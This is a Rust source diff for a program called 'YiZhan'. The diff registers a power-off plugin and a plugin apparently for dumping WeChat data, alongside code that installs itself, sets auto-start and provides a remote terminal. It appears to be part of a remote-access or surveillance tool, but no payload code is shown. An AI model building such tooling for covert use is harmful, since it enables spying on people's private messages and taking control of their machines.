@@ -5,7 +5,6 @@ use std::time::Duration;
 use clap::{Parser, Subcommand};
 use client::YiZhanClient;
 use config::YiZhanNodeConfig;
-use error::YiZhanResult;
 use network::YiZhanNetwork;
 use random_names::RandomName;
 use server::YiZhanServer;
@@ -17,6 +16,9 @@ use yizhan_bootstrap::{
     get_program_dir, install_bootstrap, install_running_program, is_running_process_installed,
     set_auto_start, spawn_program,
 };
+use yizhan_common::error::YiZhanResult;
+use yizhan_plugin_poweroff::YiZhanPowerOffPlugin;
+use yizhan_plugin_wechat::YiZhanDumpWxPlugin;
 use yizhan_protocol::version::VersionInfo;
 
 use crate::{console::Console, terminal::remote::RemoteTerminal};
@@ -27,11 +29,11 @@ mod config;
 mod connection;
 mod console;
 mod context;
-mod error;
 mod message;
 #[cfg(windows)]
 mod mutex;
 mod network;
+mod plugins;
 mod serve;
 mod server;
 mod tcp;
@@ -122,10 +124,15 @@ async fn run() -> YiZhanResult<()> {
     let predefined_config = include_str!("../../../yizhan.toml");
     let config: YiZhanNodeConfig = toml::from_str(predefined_config).unwrap();
 
+    let plugin_power_off = YiZhanPowerOffPlugin::default();
+    let plugin_wx = YiZhanDumpWxPlugin::default();
+
     if mode == Some(Action::Server) {
         info!("Running at server mode");
         let server = YiZhanServer::new(TcpServe::new(&config.server).await?);
         let network = YiZhanNetwork::new(server, name, version, true, config);
+        network.add_plugin(Box::new(plugin_power_off)).await;
+        network.add_plugin(Box::new(plugin_wx)).await;
         network.run().await?;
     } else if mode == Some(Action::Client) {
         info!("Running at client mode");
@@ -138,6 +145,8 @@ async fn run() -> YiZhanResult<()> {
             Box::new(RemoteTerminal::new())
         };
         network.add_console(terminal).await;
+        network.add_plugin(Box::new(plugin_power_off)).await;
+        network.add_plugin(Box::new(plugin_wx)).await;
         network.run().await?;
     } else {
         info!("No action specified, installing ...");
